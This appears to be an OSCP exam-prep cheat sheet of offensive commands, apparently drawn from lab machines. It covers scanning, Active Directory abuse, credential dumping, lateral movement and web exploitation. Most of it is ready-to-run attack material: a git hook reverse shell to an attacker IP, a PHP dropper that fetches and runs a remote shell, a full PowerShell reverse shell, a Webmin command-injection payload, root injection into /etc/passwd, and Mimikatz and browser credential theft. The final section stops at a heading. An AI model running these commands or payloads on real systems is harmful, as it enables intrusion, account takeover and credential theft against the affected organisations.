# OSCP Consolidated Commands Reference

This document provides a comprehensive reference of working commands extracted from lab machine notes. Each section follows a logical penetration testing flow and includes multiple variations (flags, authentication levels) for maximum reliability.

---

## 0. Impacket & Auth Swiss Army Knife
Essential for lateral movement and credential harvesting.

- **Authenticated Access (SMB/WMI/PSExec):**
  - `impacket-psexec DOMAIN/user:password@10.10.10.10`
  - `impacket-wmiexec DOMAIN/user:password@10.10.10.10`
  - `impacket-secretsdump DOMAIN/user:password@10.10.10.10`
- **Pass-the-Hash:**
  - `impacket-psexec -hashes :NT_HASH DOMAIN/user@10.10.10.10`
- **AD Enumeration:**
  - `impacket-lookupsid DOMAIN/user:password@10.10.10.10`
  - `impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -no-pass -dc-ip [DC_IP] -request`
- **Kerbrute Enumeration:**
  - `kerbrute userenum -d [DOMAIN] --dc [DC_IP] [USERLIST]`
- **Minidump Analysis (pypykatz):**
  - `pypykatz lsa minidump lsass.DMP`

---

## 1. Scanning & Reconnaissance

### NMAP (General)
Always try multiple scan speeds and script combinations.

- **Fast Full Scan:**
  ```bash
  nmap -sS -p- -T4 -vv 10.10.10.10
  ```
- **Standard OSCP Scan (Service/Scripts/OS):**
  ```bash
  nmap -sV -sC -O -oN nmap_report 10.10.10.10
  ```
- **UDP Scan (Slow, pick top ports):**
  ```bash
  sudo nmap -sU --top-ports 100 -sV 10.10.10.10
  ```
- **Script-Specific Scan (Vulnerability check):**
  ```bash
  nmap --script "vuln or exploit" -p 80,443,445 10.10.10.10
  ```

### Web Discovery (Fuzzing)
- **Directory Fuzzing (Standard):**
  ```bash
  ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt
  gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/big.txt -t 50
  # Lowercase Wordlist (High Success for Bulma/Modern frameworks):
  # /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  ```
- **Credential Harvesting (CeWL)**:
  - *Why*: Use when standard wordlists fail and you suspect lore-based passwords (e.g., Gotham).
  ```bash
  cewl -w target_wordlist.txt http://10.10.10.10/
  ```
    ffuf -u http://[DOMAIN] -H "Host: FUZZ.[DOMAIN]" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
  ```
- **CloudSync Execution (Linux -> Windows)**:
  - *Scenario*: Windows Web Server syncs files from an unauthenticated S3-compatible Linux storage.
  - *Method*: `PUT` a PHP download script on Linux to trigger execution on Windows.
  ```bash
  curl -X PUT http://100.130.140.168/storage/download.php --data-binary @download.php
  # download.php downloads and executes the final shell from Kali.
  ```
  - **download.php Content**:
    ```php
    <?php
    $remote_file = "http://[KALI_IP]/revs.php";
    $local_file = "revs_local.php";
    $content = file_get_contents($remote_file);
    if ($content !== false) {
        file_put_contents($local_file, $content);
        include($local_file);
    }
    ?>
    ```
- **SNMP Enumeration (UDP 161)**:
  - *Scan*: `nmap -sU --top-ports 100 [IP]`
  - *Standard Walk*: `snmpwalk -v 2c -c public [IP]`
  - *Check (Detailed)*: `snmp-check [IP] -c public`
  - *Deep Dive*: See Section 4 (SNMP Command Cheatsheet) for custom script and credential extraction.

- **Extension Brute Force**:
  ```bash
  ffuf -u http://10.10.10.10/FUZZ -w list.txt -e .php,.txt,.bak,.old,.zip -ac
  ```
- **Parameter Enumeration (Fuzzing ?FUZZ=)**: 
  - *Scenario*: Found a script (e.g., `evil.php`) but need to find its input parameters.
  - `ffuf -u http://10.10.10.10/evil.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -ac`
  - `ffuf -u http://10.10.10.10/evil.php?FUZZ=1 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac`
- **Fuzzing with Basic Authentication:**
  ```bash
  # admin:admin -> base64 -> YWRtaW46YWRtaW4=
  ffuf -u http://10.10.10.10/system/FUZZ -w common.txt -H "Authorization: Basic YWRtaW46YWRtaW4="
  ```
- **Git Repository Discovery & Analysis**:
  - *Scan*: DIRB/Gobuster finding `.git/HEAD`.
  - *Dump*: `git-dumper http://[IP]/.git/ .git`
  - *Forensics*:
    ```bash
    git log                       # List all commits
    git show [COMMIT_HASH]        # Inspect specific commit for leaked secrets
    git show HEAD:[FILE_PATH]     # View file at specific version
    # Find branch size anomalies (potential rabbit holes or hidden paths)
    ls -lna .git/logs/refs/heads | sort -n -r
    ```
- **Git Hook RevShell Injection**:
  ```bash
  cat <<EOF > .git/hooks/post-commit
  #!/bin/bash
  sh -i >& /dev/tcp/[KALI_IP]/4444 0>&1
  EOF
  chmod +x .git/hooks/post-commit
  7z a shell.zip .git/
  cp shell.zip /home/jen/public/repos
  ```


### SMB Enumeration
Try null sessions and guest accounts first.

- **List Shares & Computer Name**:
  ```bash
  smbclient -L [IP] -N
  # Result: Look for 'NetBIOS computer name' or 'Server' comment
  # Crucial for: SMTP HELO/MAIL FROM domain discovery [ClamAV]
  ```
- **Null Session (No credentials):**
  ```bash
  smbclient -L //10.10.10.10 -N
  rpcclient -U "" -N 10.10.10.10
  ```
- **Check Null Session (Shares):**
  ```bash
  netexec smb 10.10.10.10 -u '' -p ''
  smbmap -H 10.10.10.10
  ```
- **Guest Account:**
  ```bash
  smbclient -L //10.10.10.10 -U guest%
  netexec smb 10.10.10.10 -u guest -p ''
  smbmap -H 10.10.10.10 -u guest -p ''
  ```
- **Password Spraying (Targeted Wordlist)**:
  - *Tip*: Try `SeasonYear` (e.g., `Spring2023`), `Username`, and `emansenru` (reversed username).
- **Authenticated (User:Pass):**
  ```bash
  smbclient //10.10.10.10/[SHARE] -U 'DOMAIN/user%password'
  netexec smb 10.10.10.10 -u user -p password
  smbmap -H 10.10.10.10 -u user -p password
  ```
- **RID Brute Forcing (User Enumeration):**
  ```bash
  netexec smb 10.10.10.10 -u guest -p '' --rid-brute
  rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
  ```
- **Recursive Directory Listing (Find specific files):**
  ```bash
  smbmap -H 10.10.10.10 -u user -p password -R [SHARENAME]
  netexec smb 10.10.10.10 -u user -p password -M spider_plus
  ```

- **Connecting to Shares (Interactive):**
  ```bash
  # Using Password
  smbclient //10.10.10.10/[SHARE] -U 'DOMAIN/user%password'
  # Using Guest (Null Session)
  smbclient //10.10.10.10/[SHARE] -N
  ```

- **NTLM Capture & Relay (Responder + ntlmrelayx)**:
  - *Scenario*: SMB signing is NOT REQUIRED on targets. Trigger connection via LNK/Relay.
  - 1. Setup Relay Target: `impacket-ntlmrelayx -t smb://[TARGET_IP] -smb2support`
  - 2. Setup Responder (Disable SMB/HTTP): `sudo responder -I tun0 -dwv` (Ensure `SMB = Off` in `Responder.conf`)
  - 3. Trigger Connection: Upload a malicious `.lnk` file to a writable share.
  - *LNK Generation*: `python3 ntlm_theft.py -g lnk -s [KALI_IP] -f trigger`

- **LDAP Enumeration (oscp.exam)**:
  ```bash
  ldapsearch -H ldap://[DC_IP] -x -D "user@domain.local" -w "password" -b "dc=domain,dc=local" "(objectClass=group)" sAMAccountName
  ```

- **Nmap AD Full Scan**:
  ```bash
  nmap [IP] -sV -sC -p- -T4 -vv
  ```
- **NTLM Hash Theft (Writable Share)**:
  - *Why*: If you have write access to a share, force users to authenticate to your Kali.
  - 1. Generate LNK: `python3 ntlm_theft.py -g lnk -s 172.10.10.10 -f theft`
  - 2. Listen: `impacket-smbserver share . -smb2support`
  - 3. Upload `.lnk` file to the victim share. Wait for capture.

### LDAP Enumeration
- **Null Base Search:**
  ```bash
  ldapsearch -x -H ldap://10.10.10.10 -b "dc=[DOMAIN],dc=local"
  ```
- **Authenticated User Search:**
  ```bash
  ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "dc=[DOMAIN],dc=local" "(objectClass=user)" sAMAccountName
  ```
- **Fetch User Descriptions (Common leak path):**
  ```bash
  netexec ldap 10.10.10.10 -u user -p password -M get-desc-users
  ```

### SNMP Command Cheatsheet
Comprehensive commands for deep SNMP enumeration and logic-based exploitation.

| Information Detail | Command (Using Name) | Command (Using OID / If Name Fails) |
| :--- | :--- | :--- |
| **Full OID Dump** | `snmpwalk -v 2c -c public [IP]` | `snmpwalk -v 2c -c public [IP] .1.3.6` |
| **Custom Scripts** | `snmpwalk -v 2c -c public [IP] NET-SNMP-EXTEND-MIB::nsExtendObjects` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.4.1.8072.1.3` |
| **System Info** | `snmpwalk -v 2c -c public [IP] SNMPv2-MIB::sysDescr` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.1.1` |
| **Running Procs** | `snmpwalk -v 2c -c public [IP] HOST-RESOURCES-MIB::hrSWRunName` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.25.4.2.1.2` |
| **Proc Arguments** | `snmpwalk -v 2c -c public [IP] HOST-RESOURCES-MIB::hrSWRunParameters` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.25.4.2.1.5` |
| **Installed Apps** | `snmpwalk -v 2c -c public [IP] HOST-RESOURCES-MIB::hrSWInstalledName` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.25.6.3.1.2` |
| **User Accounts** | `snmpwalk -v 2c -c public [IP] HOST-RESOURCES-MIB::hrSWRunPath` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.25.4.2.1.4` |
| **Disk Storage** | `snmpwalk -v 2c -c public [IP] HOST-RESOURCES-MIB::hrStorageDescr` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.25.2.3.1.3` |
| **TCP Ports** | `snmpwalk -v 2c -c public [IP] TCP-MIB::tcpConnState` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.6.13.1.1` |
| **Network Interfaces** | `snmpwalk -v 2c -c public [IP] IF-MIB::ifDescr` | `snmpwalk -v 2c -c public [IP] .1.3.6.1.2.1.2.2.1.2` |

**Common Community Strings (The "Usual Suspects"):**
If `public` fails, try these immediately:
- `private` (Often Read-Write)
- `manager`, `admin`, `internal`, `monitor`, `secret`, `root`
- `snmp`, `read`, `write`, `cisco`, `agent`

**Discovery Tooling:**
```bash
# Brute force community strings (The "Brute Force Everything" Rule)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt [IP]
# Automated enumeration
snmp-check [IP] -c [COMMUNITY]
```

> [!TIP]
> **Brute Force Everything**: If standard enumeration fails, escalate to brute forcing. Use `onesixtyone` for community strings and `hydra` or `ncrack` for services. SNMP is often a goldmine for credentials hidden in `.1.3.6` dumps.
>
> **SNMP Version Fallback**: If `-v 2c` is slow or times out on legacy machines (Sarge/Debian 8), drop to `-v 1`:
> `snmpwalk -v 1 -c [COMMUNITY] [IP] .1.3.6.1.2.1.25.4.2.1.2`

---

## 2. Active Directory (Windows)

### Roasting Attacks
- **AS-REP Roasting (No initial creds needed):**
  - **Impacket**: `impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10`
  - **Rubeus**: `Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt`
- **Inter-Domain Ticket Abuse (Rubeus -> Kali)**:
  ```bash
  # 1. Export ticket from DC02 (Windows)
  .\Rubeus.exe dump /nowrap
  # 2. Save and convert on Kali
  echo "<BASE64_TICKET>" | base64 -d > ticket.kirbi
  impacket-ticketConverter ticket.kirbi ticket.ccache
  # 3. Setup local krb5.conf (Required for inter-domain routing)
  # [realms] MARINE.COM = { kdc = 100.130.140.200 ... }
  # 4. Get ST and DCSync
  export KRB5CCNAME=ticket.ccache
  export KRB5_CONFIG=./krb5.conf
  kvno cifs/dc01.marine.com
  impacket-secretsdump -k -no-pass -dc-ip 100.130.140.200 -just-dc-user 'MARINE/Administrator' dc01.marine.com
  ```
- **Kerberoasting (Requires user creds):**
  - **Impacket**: `impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
  - **Rubeus**: `.\Rubeus.exe kerberoast /outfile:hashes.txt` (Dumps for local cracking)
  - **Cracking**: `hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt`

- **RPC Password Change (ForceChangePassword)**:
  - *Why*: If you have ForceChangePassword rights over another user.
  - `net rpc password "target_user" "NewPass123!" -U "DOMAIN/user%password" -S 10.10.10.10`

### AD Object Manipulation (BloodyAD)
Use this for interacting with AD objects from Kali without requiring a full Windows foothold.

- **Check Current User Rights**:
  ```bash
  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 get object 'CN=target_user,CN=Users,DC=domain,DC=local'
  ```
- **Add User to a Group (GenericAll/WriteMember rights)**:
  ```bash
  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 add groupMember 'CN=Domain Admins,CN=Users,DC=domain,DC=local' 'CN=my_user,CN=Users,DC=domain,DC=local'
  ```
- **Reset User Password (GenericAll/ForceChangePassword rights)**:
  ```bash
  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 set password 'CN=target_user,CN=Users,DC=domain,DC=local' 'NewPassword123!'
  ```
- **GenericAll Escalation (Feast)**:
  ```bash
  bloodyAD -u 'user' -p 'pass' -d 'ocean.com' --host 100.130.140.169 set password 'target_user' 'NewPassword123!'
  ```

- **GenericWrite to SPN Hijack (Kerberoasting)**:
  - *Scenario*: You have `GenericWrite` over a user but cannot reset their password.
  - 1. Set SPN for Target: `bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host [DC_IP] set object [TARGET_USER] servicePrincipalName -v 'http/target.domain.local'`
  - 2. Kerberoast: `impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
  - 3. Crack & Pwn: Use John/Hashcat to find the plain-text password.
- **Force Change Password (Poseidon)**:
  ```bash
  bloodyAD -u 'Mona' -p 'Monapass' -d 'sub.marine.com' --host 100.130.140.200 set password 'Jackie' 'PwnedJackie123!'
  ```

- **Reset User Password (bloodyAD Target CN)**:
  - *Scenario*: When you have the specific CN of the user (e.g. `CN=DONNA CHAMBERS,CN=USERS,DC=MARINE,DC=COM`).
  ```bash
  bloodyAD -u 'Mona' -p 'Monapass' -d 'sub.marine.com' --host 100.130.140.200 set password 'CN=[TARGET_CN]' '[NEW_PASSWORD]'
  ```

### Group Policy (GPO) Abuse
Requires `WriteOwner` or `GenericAll` over a GPO object.

- **1. Grant Rights via bloodyAD (from Kali)**:
  ```bash
  bloodyAD -d [DOMAIN] -u [USER] -p [PASS] --host [DC_IP] add genericAll "CN={GPO_GUID},CN=Policies,CN=System,DC=domain,DC=local" [USER]
  ```

- **2. Inject Admin Group (SecEdit Template)**:
  Navigate to the GPO folder in `SYSVOL`: `\\domain\SYSVOL\domain\Policies\{GPO_GUID}\Machine\Microsoft\Windows NT\SecEdit\`
  Create or modify `GptTmpl.inf`:
  ```ini
  [Unicode]
  Unicode=yes
  [Group Membership]
  *S-1-5-32-544__Members = [TARGET_USER]
  [Version]
  signature="$CHICAGO$"
  Revision=1
  ```

- **3. Bump GPO Version**:
  Modify `GPT.INI` in the root of the GPO folder:
  ```powershell
  (Get-Content GPT.INI) -replace 'Version=\d+', 'Version=99999' | Set-Content GPT.INI
  ```

- **4. Trigger Update**:
  `gpupdate /force` on any domain machine to apply the group membership.
- **RPC Password Reset (ForceChangePassword Rights):**
  - `net rpc password [TARGET_USER] [NEW_PASS] -U [DOMAIN]/[MY_USER]%[MY_PASS] -S [DC_IP]`

### Advanced AD Paths (OCD Style)

#### 1. AD CS (Certificate Services)
- **Discovery (Certipy):**
  ```bash
  certipy find -u [USER]@[DOMAIN] -p [PASS] -dc-ip [DC_IP] -vulnerable
  ```
- **ESC1 (Enrollee Supplies Subject):**
  - *Scenario*: Template allows SAN specification (impersonation).
  - `certipy req -u [USER]@[DOMAIN] -p [PASS] -ca [CA_NAME] -template [VULN_TEMPLATE] -upn administrator@[DOMAIN] -dc-ip [DC_IP]`
  - `certipy auth -pfx administrator.pfx -dc-ip [DC_IP]`
- **ESC8 (AD CS NTLM Relay):**
  - *Scenario*: Web Enrollment (HTTP) is enabled without NTLM protection.
  - 1. Setup Relay: `impacket-ntlmrelayx -t http://[CA_IP]/certsrv/certfnsh.asp -smb2support --adcs --template [TEMPLATE]`
  - 2. Trigger Auth: Use PetitPotam or SpoolSample to the relay.

#### 2. Shadow Credentials (msDS-KeyCredentialLink)
- **Scenario**: You have **GenericWrite** or **GenericAll** over a user/computer but cannot reset their password.
- **Execution (Certipy):**
  ```bash
  certipy shadow auto -u [MY_USER]@[DOMAIN] -p [MY_PASS] -account [TARGET_ACCOUNT] -dc-ip [DC_IP]
  ```
- **Execution (PyWhisker):**
  ```bash
  python3 pywhisker.py -d [DOMAIN] -u [MY_USER] -p [MY_PASS] --target [TARGET] --action "add"
  ```
- **Note**: This generates a certificate you use to authenticate via PKINIT.
- **RBCD (Resource-Based Constrained Delegation)**:
  ```bash
  # 1. Add Computer
  impacket-addcomputer 'sub.marine.com/Jackie:PwnedJackie123!' -computer-name 'ATTACKER_PC$' -computer-pass 'PwnedPC123!' -dc-ip 100.130.140.200
  # 2. Add RBCD
  bloodyAD -u 'Jackie' -p 'PwnedJackie123!' -d 'sub.marine.com' --host 100.130.140.200 add rbcd 'DC02$' 'ATTACKER_PC$'
  # 3. Get ST
  impacket-getST -dc-ip 100.130.140.200 -spn "cifs/DC02.sub.marine.com" -impersonate Administrator 'sub.marine.com/ATTACKER_PC$:PwnedPC123!'
  ```
- **Set GenericWrite (e.g., set DS-Install-Replica for DCSync)**:
  ```bash
  # Granting DCSync rights to a user
  bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.123.140 add right 'DC=oscp,DC=exam' 'CN=celia.almeda,CN=Users,DC=oscp,DC=exam' DCSync
  ```

- **BloodHound-Python with DNS TCP (Bypass DNS errors)**:
  ```bash
  proxychains bloodhound-python -d [DOMAIN] -u [USER] -p [PASS] -ns [DC_IP] -c All --dns-tcp
  ```

### Credential Dumping
- **Secretsdump (From Kali):**
  ```bash
  impacket-secretsdump [DOMAIN]/[USER]:[PASS]@10.10.10.10
  impacket-secretsdump -sam SAM -system SYSTEM LOCAL
  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
  ```

- **Backup Operators Access (Bypass ACLs)**:
  - *Indicator*: `whoami /all` shows `BUILTIN\Backup Operators`.
  - *Method*: Bypass ACLs to dump the SAM and SYSTEM hives.
  - *Execution (PowerShell)*:
    ```powershell
    reg save hklm\sam sam.save
    reg save hklm\system system.save
    ```
  - *Note*: You can then download these files and Use `secretsdump.py` locally.
- **Mimikatz Secrets & SAM Dump (Authenticated SYSTEM)**:
  ```powershell
  .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
  .\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
  ```
- **Rubeus (Dump Current Session Tickets):**
  ```powershell
  Rubeus.exe triage
  Rubeus.exe dump /nowrap
  ```
- **LSA Secret Harvesting (DC Admin)**:
  - *Tactic*: Check `_SC_SNMPTRAP` or other service secrets for service account credentials.
  ```bash
  impacket-secretsdump 'ocean.com'/'user1':'pass1'@100.130.140.171
  # Result: ocean\administrator:BigFeast999!
  ```
- **Backup Operators PrivEsc**:
  ```powershell
  # Requires BUILTIN\Backup Operators
  reg save hklm\sam sam.save
  reg save hklm\system system.save
  # Local Download then:
  impacket-secretsdump -sam sam.save -system system.save LOCAL
  ```
- **LAPS Password Reading**:
  - **Netexec**: `netexec smb 10.10.10.10 -u [USER] -p [PASS] --laps`
  - **pyLAPS**: `python3 pyLAPS.py --action get -d [DOMAIN] -u [USER] -p [PASS]`

#### 🏹 Internal Network Discovery (Post-Foothold)
If tools like Nmap are missing on a compromised Windows host, use this PowerShell loop for quick port discovery:
```powershell
$ips = 10..15 | % { "172.16.247.$_" }
$ports = @(21,22,25,53,80,135,139,445,1433,3389,5985,8080)
foreach ($ip in $ips) {
    foreach ($port in $ports) {
        try {
            $socket = New-Object System.Net.Sockets.TcpClient
            $res = $socket.BeginConnect($ip, $port, $null, $null)
            if ($res.AsyncWaitHandle.WaitOne(200, $false)) {
                $socket.EndConnect($res)
                Write-Host "[+] $ip : $port - OPEN" -ForegroundColor Green
            }
            $socket.Close()
        } catch { }
    }
}
```

**Internal Net Scanner (Subnet Example):**
```powershell
$ips = 10..15 + 82..83 | % { "100.130.140.$_" }
$ports = @(21,22,25,53,80,111,135,139,389,443,445,1433,3306,3389,5985,5986,8080)
foreach ($ip in $ips) {
    foreach ($port in $ports) {
        try {
            $socket = New-Object System.Net.Sockets.TcpClient
            $res = $socket.BeginConnect($ip, $port, $null, $null)
            if ($res.AsyncWaitHandle.WaitOne(200, $false)) {
                $socket.EndConnect($res)
                Write-Host "[+] $ip : $port - OPEN" -ForegroundColor Green
            }
            $socket.Close()
        } catch { }
    }
}
```
- **Offline Chrome Password Extraction**:
  - *File*: `%LocalAppData%\Google\Chrome\User Data\Default\Login Data` (SQLite)
  - *Action*: Copy file to Kali and query: `sqlite3 'Login Data' "SELECT origin_url, username_value FROM logins;"` (Note: `password_value` is encrypted).
- **Offline Browser Credential Harvesting (Firefox)**:
  - *Scenario*: When you have a shell as a user, check for `.mozilla` profiles.
  - *Path (Linux)*: `~/.mozilla/firefox/[PROFILE].default-release/`
  - *Target Files*: `logins.json` (AES Encrypted) and `key4.db` (Master Key storage).
  - *Exfiltration*:
    ```bash
    scp user@TargetIP:/home/user/.mozilla/firefox/xxx.default/{logins.json,key4.db} ./
    ```
  - *Decryption*: Use `firepwd-ng.py` or `firefox_decrypt.py` on Kali to extract plain-text credentials.
- **Offline NTDS Dumping (Secretsdump)**:
  - *Scenario*: You've stolen the `ntds.dit` and `SYSTEM` files from a backup or share.
  - `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`
- **gMSA Password Reading (GMSAPasswordReader)**:
  - *Why*: If a user has rights to read a Group Managed Service Account password.
  - `.\GMSAPasswordReader.exe --AccountName 'svc_apache'`
- **Mimikatz (Credential Dumps):**
  ```powershell
  privilege::debug
  # Dump LSA (NTSM/Cleartext)
  sekurlsa::logonpasswords
  # Dump SAM (Local Hashes)
  lsadump::sam
  # Dump LSA Secrets
  lsadump::secrets
  # Dump Cache
  sekurlsa::msv
  ```
- **Windows Context Switching (Runas):**
  ```powershell
  runas /user:DOMAIN\Administrator cmd.exe
  # For local user:
  runas /user:Administrator cmd.exe
  ```
- **Windows/PowerShell File Search:**
  ```powershell
  # Force list including hidden files
  Get-ChildItem -Force
  dir -Force
  ls -Force
  
  # Recursive search for "history" files (Fast)
  dir C:\ -Filter *history* -Recurse -ErrorAction SilentlyContinue
  Get-ChildItem -Path C:\ -Include *history* -Recurse -ErrorAction SilentlyContinue
  Get-ChildItem -Path C:\Users\ -Filter ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
  
  # CMD Native Search (Fast)
  where /R C:\ *history*
  ```

### Restricted Shell (rbash) Escape
- **SSH Tunneling (SOCKS Proxy):**
  ```bash
  # Start dynamic port forward (Kali -> Target)
  ssh -D 1080 Mona@100.130.140.200
  # Use via proxychains:
  proxychains nmap -sT 10.10.x.x
  ```
- **SSH Command Override**:
  ```bash
  ssh [user]@[IP] -t "bash --noprofile"
  ```
- **Vi/Vim Escape**:
  ```text
  1. vi
  2. :set shell=/bin/bash
  3. :shell
  ```
- **Python Escape**:
  ```python
  python3 -c 'import os; os.system("/bin/bash")'
  ```
- **Fix PATH**:
  ```bash
  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  ```

### Lateral Movement & Execution
- **PsExec (SMB session):**
  ```bash
  impacket-psexec [DOMAIN]/[USER]:[PASS]@10.10.10.10
  impacket-psexec -hashes :[NTHASH] [USER]@10.10.10.10
  ```
- **WmiExec (Quieter than PsExec):**
  ```bash
  impacket-wmiexec [DOMAIN]/[USER]:[PASS]@10.10.10.10
  ```
- **Evil-WinRM:**
  ```bash
  evil-winrm -i 10.10.10.10 -u [USER] -p [PASS]
  evil-winrm -i 10.10.10.10 -u [USER] -H [NTHASH]
  ```
- **Invoke-RunasCs (PowerShell Lateral Movement)**:
  ```powershell
  Import-Module .\Invoke-RunasCs.ps1
  Invoke-RunasCs -Username [USER] -Password [PASS] -Command "cmd.exe" -Remote 172.10.10.10:443
  ```
- **Restricted Admin Mode RDP (Pass-the-Hash RDP)**:
  - *Enable*: `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
  - *Login*: `mstsc.exe /v:10.10.10.10 /restrictedadmin`
  - *Context*: Allows RDP access using the current user's token or via `pth-winexe`.

### AD Object Hijacking & BloodHound
- **Collecting Data:**
  ```bash
  python3 bloodhound.py -u user -p pass -d domain.local -ns 10.10.10.10 -c All
  ```
- **DCSync (If User has Right):**
  ```bash
  impacket-secretsdump -just-dc [DOMAIN]/[USER]:[PASS]@10.10.10.10
  ```
- **GPO Abuse (GenericWrite on GPO)**:
  - *Why*: If you have write access to a Group Policy Object.
  - `.\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount [MY_USER]`
  - Apply immediately: `gpupdate /force`
- **GPO Abuse via GPMC (Admin Interface)**:
  - *Action*: If you have UI access and GenericWrite on a GPO, use `gpmc.msc`.
  - *Path*: `Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks`.
  - *Task*: Create "Immediate Task" to run `net localgroup "Domain Admins" [USER] /add`.

### Native AD Enumeration (PowerShell)
Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded yet.

- **Enumerate Users with SPNs (LDAP Search)**:
  ```powershell
  $ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
  $domain = New-Object System.DirectoryServices.DirectoryEntry
  $search = New-Object System.DirectoryServices.DirectorySearcher($domain)
  $search.Filter = $ldapFilter
  $search.FindAll() | %{ $_.GetDirectoryEntry() | Select-Object @{N="User";E={$_.sAMAccountName}}, @{N="SPN";E={$_.servicePrincipalName}} }
  ```

---

## 3. Initial Access (Web & CMS)

### PHP Logic & Auth Bypasses

### /etc/passwd Root Injection
-| **Hidden .passwd file** | `cat /home/[USER]/.passwd` | Check home dirs for hidden credential files |
| **Encrypted SSH Key** | `ssh2john id_rsa > hash` -> `john` | Found `id_rsa` with `Proc-Type: 4,ENCRYPTED` [EvilboxOne] |
- **Step 1: Generate Hash**: `openssl passwd -1 -salt [USER] [PASSWORD]`
- **Step 2: Inject**: `echo 'hacker:[HASH]:0:0:root:/root:/bin/bash' >> /etc/passwd`
- **Alternative (Perl)**: `perl -e 'print crypt("password", "salt"),"\n"'`
- **PHP Type Juggling (strcmp Bypass)**:
  - *Indicator*: Auth logic uses `strcmp($post_pass, $real_pass) == 0`.
  - *Exploit*: Send the password as an array in the request.
  - *Payload*: `username=admin&password[]=anyvalue`
  - *Why*: `strcmp(array, string)` returns `NULL`, and `NULL == 0` is true in PHP non-strict comparisons.
- **PHP Loose Comparison (==)**:
  - *Indicator*: `if ($_POST['code'] == "0e123")`
  - *Exploit*: Send a value that evaluates to the same scientific notation (e.g., `0e456`).

### File Upload Bypasses
- **.htaccess Bypass (Add Type)**:
  - *Scenario*: Upload folder blocked PHP but allows `.htaccess`.
  - 1. Upload `.htaccess` with content: `AddType application/x-httpd-php .php16`
  - 2. Upload shell as `shell.php16`. The server will now execute it as PHP.
- **Client-Side Bypass**: Use Burp to intercept and change extension/MIME type.
- **Double Extension**: `shell.php.jpg` or `shell.php.png`

### Application Specific RCE
- **ManageEngine Applications Manager (Port 8443)**:
  - *Identify*: ManageEngine Applications Manager login served on port 8443. Default `admin:admin`.
  - *Method*: **Admin** -> **Actions** -> **Execute Program**.
  - *Reverse Shell Payload (PowerShell)*:
    ```powershell
    powershell -c "$c=New-Object Net.Sockets.TCPClient('[KALI_IP]',[PORT]);$s=$c.GetStream();$b=New-Object Byte[] 65536;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
    ```

### WordPress
- **Scan Users & Plugins:**
  ```bash
  wpscan --url http://10.10.10.10 --enumerate u,vp,vt --plugins-detection aggressive --disable-tls-checks
  ```
- **Brute Force:**
  ```bash
  wpscan --url http://10.10.10.10 --usernames user_list.txt --passwords rockyou.txt
  ```
- **WordPress User Brute Force:**
  ```bash
  wpscan --url http://[TARGET_URL] -U [USER] -P [WORDLIST]
  # Batch: wpscan --url http://[TARGET_URL] --enumerate u --passwords /usr/share/wordlists/rockyou.txt
  ```

### Joomla (JoomScan)
- **Scan Users & Plugins:**
  ```bash
  joomscan --url http://10.10.10.10 --enumerate-components
  ```
- **Specific Component Search:**
  ```bash
  joomscan --url http://10.10.10.10 -e
  ```
- **Joomla SQLi (CVE-2017-8917):**
  - *Note*: Common in version 3.7.0. Can lead to RCE via sessions/admin access. 
  - *Warning*: Often acts as a **Rabbit Hole** (Glasgow Smile). If PoCs fail, shift to brute-forcing admin with a `cewl` wordlist.

- **Webmin GnuPG Command Injection (CVE-2021-34991 equivalent):**
  - *Context*: Found in MiniServ/Webmin GnuPG module.
  - *Payload (Key Name)*: `"; bash -c 'bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1' #`
  - *Execution*: Create the key with the payload name, then click **Sign** to trigger.

- **Sendmail ClamAV-Milter Command Injection (CVE-2007-4560):**
